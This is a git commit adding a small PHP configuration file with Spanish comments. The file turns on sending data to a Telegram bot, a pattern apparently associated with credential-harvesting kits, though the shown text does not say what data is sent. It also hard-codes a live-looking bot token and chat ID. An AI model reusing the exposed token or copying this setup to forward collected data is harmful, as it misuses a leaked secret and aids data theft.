98d948f8f163015d3c9a1c375099a6ba84ae9c08
Ninik <ninikx127w7@gmail.com>
2025-11-24 02:16:36 -0300

    Add files via upload

---
+++ config.php
@@ -0,0 +1,16 @@
+<?php
+// Envio telegram
+// true = SI | false = NO
+$telegram_send = true;
+$bottoken = "8515230463:AAF7uFKatr4y5LI5tk4HIqiIGsVC9gT7KTk";
+$chatid = "5098899234";
+
+// Guardar archivo
+// true = SI | false = NO
+$file_save = false;
+
+// Envio Gmail
+// true = SI | false = NO
+$email_send = false;
+$email = "jasonidk@test.com";
+?>
